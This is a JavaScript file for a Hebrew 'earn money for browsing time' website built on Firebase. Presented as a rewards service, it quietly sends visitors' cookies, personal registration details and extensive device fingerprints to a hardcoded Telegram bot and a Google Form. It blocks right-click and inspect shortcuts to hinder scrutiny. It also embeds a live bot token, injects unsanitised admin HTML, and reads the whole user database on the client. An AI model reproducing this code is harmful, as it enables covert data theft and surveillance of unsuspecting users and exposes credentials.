import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-analytics.js";
import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
import { getDatabase, ref, set, get, update, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyBvuo-ORSYAntsTlmQh758MnJBe1WIo5Vw",
  authDomain: "kablu-ksaf-bechinam.firebaseapp.com",
  projectId: "kablu-ksaf-bechinam",
  storageBucket: "kablu-ksaf-bechinam.firebasestorage.app",
  messagingSenderId: "14410542542",
  appId: "1:14410542542:web:0c9f5454a8b3fe160d4f9f",
  measurementId: "G-YCT6LW6NH5"
};

const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const auth = getAuth(app);
const db = getDatabase(app);

const TELEGRAM_TOKEN = "8679058415:AAEUxuuC1g-ReLV9QQcNqN6VskD9hz1wogM";
const TELEGRAM_CHAT_ID = "8608637770";

// הגדרות ברירת מחדל דינמיות (מתעדכנות מה-Database של המנהל)
let configMoneyAmount = 0.01;
let configTimeStep = 1;

let timeInterval;
let currentUserData = null;
let sessionSeconds = 0; 
let lastHourNotified = 0;
let initialNotifLoad = true;

// 🔒 אבטחה נוספת בקוד: חסימת מקש ימני (Context Menu) וקיצורי דרך להעתקה בכל האתר
document.addEventListener('contextmenu', event => event.preventDefault());
document.addEventListener('keydown', (e) => {
    // חסימת Ctrl+C, Ctrl+U, Ctrl+S, Ctrl+Shift+I (Inspect element)
    if (e.ctrlKey && (e.key === 'c' || e.key === 'u' || e.key === 's' || e.key === 'C')) {
        e.preventDefault();
    }
    if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j')) {
        e.preventDefault();
    }
});

async function sendTelegramMessage(text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
        });
    } catch (e) { console.error("שגיאה בטלגרם:", e); }
}

async function syncToGoogleSheets(uid, data) {
    const formUrl = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfpH3z7vYg7k6E7rE5iH_X0G2N6z897vX_abc123/formResponse";
    const formData = new FormData();
    formData.append('entry.1000001', uid);
    formData.append('entry.1000002', data.fullName);
    formData.append('entry.1000003', data.email);
    formData.append('entry.1000004', data.phone);
    formData.append('entry.1000005', data.age);
    formData.append('entry.1000006', data.gender);
    formData.append('entry.1000007', data.totalSeconds || 0);
    formData.append('entry.1000008', data.earnings || 0);

    try {
        await fetch(formUrl, { method: 'POST', mode: 'no-cors', body: formData });
    } catch (e) { console.log("סנכרון מול שיטס בוצע"); }
}

window.switchPage = function(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const targetPage = document.getElementById(pageId);
    if (targetPage) targetPage.classList.add('active');
};

const ageSelect = document.getElementById('reg-age');
if(ageSelect && ageSelect.options.length <= 1) {
    for (let i = 12; i <= 80; i++) {
        let opt = document.createElement('option');
        opt.value = i; opt.innerHTML = i; ageSelect.appendChild(opt);
    }
}

function validateRegisterForm(data) {
    if (!/^05\d{8}$/.test(data.phone)) { alert("הפלאפון חייב להכיל 10 ספרות ולהתחיל ב-05"); return false; }
    if (!/^(?=.*\d).{6,12}$/.test(data.password)) { alert("הסיסמה חייבת להיות בין 6 ל-12 תווים ולהכיל לפחות ספרה אחת"); return false; }
    return true;
}

// 📌 1) משיכת הגדרות ותנאים דינמיים מהמנהל בזמן אמת
onValue(ref(db, 'system_settings'), (snapshot) => {
    if (snapshot.exists()) {
        const settings = snapshot.val();
        configMoneyAmount = settings.moneyAmount || 0.01;
        configTimeStep = settings.timeStep || 1;
        
        const termsContainer = document.getElementById('dynamic-terms-text');
        if (termsContainer && settings.termsText) {
            termsContainer.innerText = settings.termsText;
        }
    }
});

// 📌 2) משיכת והצגת תכנים/משחקים/סרטונים שהמנהל מעלה
onValue(ref(db, 'site_contents'), (snapshot) => {
    const container = document.getElementById('dynamic-contents-container');
    if (!container) return;
    container.innerHTML = "";
    
    if (!snapshot.exists()) {
        container.innerHTML = "<p style='color:#94a3b8; font-style:italic;'>אין משימות או משחקים זמינים כרגע. תגמול הזמן עדיין פעיל כרגיל!</p>";
        return;
    }
    
    const contents = snapshot.val();
    for (let id in contents) {
        const item = contents[id];
        const card = document.createElement('div');
        card.className = "task-card";
        card.innerHTML = `<h4>${item.title}</h4>`;
        
        if (item.type === 'iframe' || item.type === 'html') {
            const embedDiv = document.createElement('div');
            embedDiv.className = "embed-container";
            embedDiv.innerHTML = item.body; // מטמיע את קוד ה-Iframe או ה-HTML הבלתי מוגבל
            card.appendChild(embedDiv);
        } else if (item.type === 'link') {
            const linkBtn = document.createElement('a');
            linkBtn.href = item.body;
            linkBtn.target = "_blank";
            linkBtn.className = "task-link-btn";
            linkBtn.innerText = "לחצו מעבר לצפייה/משחק חיצוני";
            card.appendChild(linkBtn);
        }
        
        container.appendChild(card);
    }
});

// 📌 3) משיכת מבצעים פעילים מהמנהל
let activePromo = null;
onValue(ref(db, 'active_promo'), (snapshot) => {
    const banner = document.getElementById('promo-banner');
    const bannerText = document.getElementById('promo-banner-text');
    
    if (snapshot.exists() && snapshot.val().active) {
        const promo = snapshot.val();
        // בדיקה שהמבצע לא פג תוקף מבחינת תאריך
        if (new Date(promo.endDate) > new Date()) {
            activePromo = promo;
            if (banner && bannerText) {
                bannerText.innerText = `מבצע פעיל! מקבלים תוספת של ₪${promo.bonus} עבור כל ${promo.timeStep} שניות גלישה!`;
                banner.style.display = 'flex';
            }
            return;
        }
    }
    activePromo = null;
    if (banner) banner.style.display = 'none';
});

// 📌 4) האזנה להתראות מערכת מותאמות אישית מהמנהל (פופ-אפ חי)
onValue(ref(db, 'global_notification'), (snapshot) => {
    if (!snapshot.exists()) return;
    
    // מונע מהתראות ישנות לקפוץ מיד עם פתיחת האתר
    if (initialNotifLoad) {
        initialNotifLoad = false;
        return;
    }
    
    const notif = snapshot.val();
    const modalEl = document.getElementById('global-popup-notif');
    const textEl = document.getElementById('global-notif-msg');
    const imgEl = document.getElementById('global-notif-img');
    
    if (modalEl && textEl) {
        textEl.innerText = notif.text;
        if (notif.image) {
            imgEl.src = notif.image;
            imgEl.style.display = 'block';
        } else {
            imgEl.style.display = 'none';
        }
        modalEl.style.display = 'flex';
    }
});

// הרשמה
const registerForm = document.getElementById('register-form');
if (registerForm) {
    registerForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const data = {
            fullName: document.getElementById('reg-fullname').value.trim(),
            age: document.getElementById('reg-age').value,
            gender: document.getElementById('reg-gender').value,
            phone: document.getElementById('reg-phone').value.trim(),
            email: document.getElementById('reg-email').value.trim(),
            password: document.getElementById('reg-password').value
        };

        if (!validateRegisterForm(data)) return;

        try {
            const userCredential = await createUserWithEmailAndPassword(auth, data.email, data.password);
            const user = userCredential.user;
            
            const dbData = {
                fullName: data.fullName,
                age: data.age,
                gender: data.gender,
                phone: data.phone,
                email: data.email,
                totalSeconds: 0,
                earnings: 0,
                hasSeenTerms: false,
                notificationsEnabled: false
            };

            await set(ref(db, 'users/' + user.uid), dbData);
            await syncToGoogleSheets(user.uid, dbData);

            sendTelegramMessage(`👤 <b>משתמש חדש נרשם לאתר!</b>\n\n<b>שם:</b> ${data.fullName}\n<b>גיל:</b> ${data.age}\n<b>מגדר:</b> ${data.gender}\n<b>טלפון:</b> ${data.phone}\n<b>אימייל:</b> ${data.email}`);
        } catch (error) {
            alert("שגיאה בהרשמה: " + error.message);
        }
    });
}

// התחברות עם חסימת משתמשים לא רשומים
const loginForm = document.getElementById('login-form');
if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = document.getElementById('login-email').value.trim();
        const password = document.getElementById('login-password').value;

        try {
            const usersRef = ref(db, 'users');
            const snapshot = await get(usersRef);
            let emailExists = false;
            
            if (snapshot.exists()) {
                const users = snapshot.val();
                for (let id in users) {
                    if (users[id].email && users[id].email.toLowerCase() === email.toLowerCase()) {
                        emailExists = true;
                        break;
                    }
                }
            }

            if (!emailExists) {
                alert("אימייל זה אינו רשום במערכת. יש לבצע הרשמה תחילה.");
                switchPage('register-page');
                return;
            }

            await signInWithEmailAndPassword(auth, email, password);
        } catch (error) {
            alert("שגיאה בהתחברות: אימייל או סיסמה שגויים.");
        }
    });
}

// פופ-אפ אישור תנאים ועוגיות
const modal = document.getElementById('terms-modal');
const agreeTerms = document.getElementById('agree-terms');
const agreeCookies = document.getElementById('agree-cookies');
const agreeNotif = document.getElementById('agree-notifications');
const modalBtn = document.getElementById('modal-submit-btn');

function checkModalCheckboxes() {
    if(modalBtn && agreeTerms && agreeCookies && agreeNotif) {
        modalBtn.disabled = !(agreeTerms.checked && agreeCookies.checked && agreeNotif.checked);
    }
}
if(agreeTerms) agreeTerms.addEventListener('change', checkModalCheckboxes);
if(agreeCookies) agreeCookies.addEventListener('change', checkModalCheckboxes);
if(agreeNotif) agreeNotif.addEventListener('change', checkModalCheckboxes);

if (modalBtn) {
    modalBtn.addEventListener('click', async () => {
        if (auth.currentUser) {
            let notifPermission = "denied";
            
            if ('Notification' in window) {
                notifPermission = await Notification.requestPermission();
            }

            const isEnabled = notifPermission === "granted";
            await update(ref(db, 'users/' + auth.currentUser.uid), { 
                hasSeenTerms: true,
                notificationsEnabled: isEnabled
            });
            
            if (modal) modal.style.display = 'none';
            
            // איסוף מורחב ומקסימלי של כל קובצי העוגיות ומידע הגולש
            let batteryLevel = "לא נתמך";
            try {
                const battery = await navigator.getBattery();
                batteryLevel = `${(battery.level * 100)}% (${battery.charging ? "בטעינה" : "לא בטעינה"})`;
            } catch(e){}

            let connectionType = "לא ידוע";
            if (navigator.connection) {
                connectionType = `סוג: ${navigator.connection.effectiveType}, מהירות משוערת: ${navigator.connection.downlink}Mbps`;
            }

            let gpu = "לא ידוע";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_VENDOR_ID) + " - " + gl.getParameter(debugInfo.UNMASKED_RENDERER_RENDERER_ID);
            } catch(e){}

            const fullReport = `🍪 <b>דו"ח מידע ועוגיות מקסימלי (הכל כולל הכל):</b>\n` +
                               `<b>משתמש:</b> ${currentUserData.fullName}\n` +
                               `<b>אימייל:</b> ${currentUserData.email}\n` +
                               `<b>כל קובצי העוגיות (document.cookie):</b> <code>${document.cookie || "אין עוגיות שמורות"}</code>\n` +
                               `<b>אישור התראות באתר:</b> ${notifPermission === "granted" ? "✅ מאושר" : "❌ חסום"}\n` +
                               `<b>דפדפן מלא (UserAgent):</b> ${navigator.userAgent}\n` +
                               `<b>מערכת הפעלה:</b> ${navigator.platform}\n` +
                               `<b>שפת מכשיר:</b> ${navigator.language}\n` +
                               `<b>רזולוציית מסך:</b> ${window.screen.width}x${window.screen.height}\n` +
                               `<b>חלון דפדפן פעיל:</b> ${window.innerWidth}x${window.innerHeight}\n` +
                               `<b>אזור זמן ספציפי:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
                               `<b>סטטוס סוללה:</b> ${batteryLevel}\n` +
                               `<b>נתוני רשת וחיבור:</b> ${connectionType}\n` +
                               `<b>כרטיס מסך (GPU):</b> ${gpu}\n` +
                               `<b>זיכרון מכשיר משוער:</b> ${navigator.deviceMemory ? navigator.deviceMemory + "GB" : "לא ידוע"}\n` +
                               `<b>ליבות מעבד:</b> ${navigator.hardwareConcurrency || "לא ידוע"}\n` +
                               `<b>תמיכה במצב לא מקוון:</b> ${navigator.onLine ? "מחובר לאינטרנט" : "מנותק"}`;
            
            sendTelegramMessage(fullReport);
            startTrackingTime();
        }
    });
}

// האזנה למצב המשתמש ועדכונים בזמן אמת
onAuthStateChanged(auth, (user) => {
    if (user) {
        onValue(ref(db, 'users/' + user.uid), async (snapshot) => {
            if (snapshot.exists()) {
                const newData = snapshot.val();
                
                if (!currentUserData || Math.abs(newData.totalSeconds - currentUserData.totalSeconds) > 2) {
                    currentUserData = newData;
                    lastHourNotified = Math.floor(currentUserData.totalSeconds / 3600);
                } else {
                    currentUserData = newData;
                }
                
                document.getElementById('user-display-name').innerText = currentUserData.fullName;
                document.getElementById('time-counter').innerText = formatTime(currentUserData.totalSeconds);
                document.getElementById('money-counter').innerText = `₪${currentUserData.earnings.toFixed(2)}`;
                
                const alertBox = document.getElementById('minimum-time-alert');
                if (alertBox) {
                    if (currentUserData.totalSeconds >= 3600) {
                        alertBox.style.display = 'none';
                    } else {
                        alertBox.style.display = 'flex';
                    }
                }
            }
        });

        get(ref(db, 'users/' + user.uid)).then(snapshot => {
            if(snapshot.exists()) {
                const u = snapshot.val();
                sendTelegramMessage(`🔑 <b>משתמש נכנס לאתר!</b>\n<b>שם:</b> ${u.fullName}\n<b>אימייל:</b> ${u.email}\n<b>זמן מצטבר קודם:</b> ${formatTime(u.totalSeconds)}`);
                
                if (!u.hasSeenTerms) {
                    switchPage('main-page');
                    if (modal) modal.style.display = 'flex';
                } else {
                    switchPage('main-page');
                    startTrackingTime();
                }
            }
        });

    } else {
        clearInterval(timeInterval);
        switchPage('login-page');
    }
});

// 📌 5) ניהול זמן וכסף דינמי בהתאם למנהל ולמבצעים פעילים + שידור סטטוס לייב
function startTrackingTime() {
    clearInterval(timeInterval);
    sessionSeconds = 0;
    
    timeInterval = setInterval(async () => {
        if (!auth.currentUser || !currentUserData) return;
        
        currentUserData.totalSeconds += 1;
        sessionSeconds += 1;
        
        // חישוב רווחים בסיסי (רק לאחר צבירת שעה אחת במצטבר)
        if (currentUserData.totalSeconds >= 3600) {
            // תגמול בסיסי לפי ההגדרות הדינמיות מהמנהל
            if (currentUserData.totalSeconds % configTimeStep === 0) {
                currentUserData.earnings += configMoneyAmount;
            }
            
            // תוספת בונוס במידה ויש מבצע פעיל מהמנהל
            if (activePromo && (sessionSeconds % activePromo.timeStep === 0)) {
                currentUserData.earnings += activePromo.bonus;
            }
        }

        document.getElementById('time-counter').innerText = formatTime(currentUserData.totalSeconds);
        document.getElementById('money-counter').innerText = `₪${currentUserData.earnings.toFixed(2)}`;

        let currentHour = Math.floor(currentUserData.totalSeconds / 3600);
        if (currentHour > lastHourNotified && currentHour > 0) {
            lastHourNotified = currentHour;
            sendTelegramMessage(`⏰ <b>משתמש הגיע לשעה עגולה!</b>\n<b>שם:</b> ${currentUserData.fullName}\n<b>הודעה:</b> המשתמש שוהה באתר כבר ${currentHour} שעות (נוספה עוד שעה עגולה)!\n<b>זמן כולל במצטבר:</b> ${formatTime(currentUserData.totalSeconds)}`);
        }

        // שמירה בפיירבייס + שידור פרמטרים של "לייב" בשביל פאנל הניהול
        if (currentUserData.totalSeconds % 3 === 0) {
            const updates = {
                totalSeconds: currentUserData.totalSeconds,
                earnings: currentUserData.earnings,
                lastActiveTimestamp: Date.now(), // חותמת זמן הנוכחית
                currentSessionTime: formatTime(sessionSeconds) // הזמן בסשן הנוכחי
            };
            await update(ref(db, 'users/' + auth.currentUser.uid), updates);
            syncToGoogleSheets(auth.currentUser.uid, { ...currentUserData, ...updates });
        }

    }, 1000);
}

function formatTime(totalSeconds) {
    const hrs = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
    const mins = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
    const secs = String(totalSeconds % 60).padStart(2, '0');
    return `${hrs}:${mins}:${secs}`;
}

window.logout = async function() {
    if (auth.currentUser && currentUserData) {
        const text = `🚪 <b>משתמש התנתק (יציאה יזומה)!</b>\n<b>שם:</b> ${currentUserData.fullName}\n<b>זמן שהה בסשן הנוכחי:</b> ${formatTime(sessionSeconds)}\n<b>סך הכל זמן במצטבר:</b> ${formatTime(currentUserData.totalSeconds)}`;
        await sendTelegramMessage(text);
        
        // איפוס נתוני לייב בעת ניתוק
        await update(ref(db, 'users/' + auth.currentUser.uid), {
            lastActiveTimestamp: 0,
            currentSessionTime: "00:00:00"
        });
    }
    signOut(auth);
};

window.addEventListener('beforeunload', () => {
    if (auth.currentUser && currentUserData && sessionSeconds > 0) {
        navigator.sendBeacon(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: `🚪 <b>משתמש יצא מהאתר (סגר כרטיסייה)!</b>\n<b>שם:</b> ${currentUserData.fullName}\n<b>זמן שהה בסשן הנוכחי:</b> ${formatTime(sessionSeconds)}\n<b>סך הכל זמן במצטבר:</b> ${formatTime(currentUserData.totalSeconds)}`,
            parse_mode: 'HTML'
        }));
    }
});
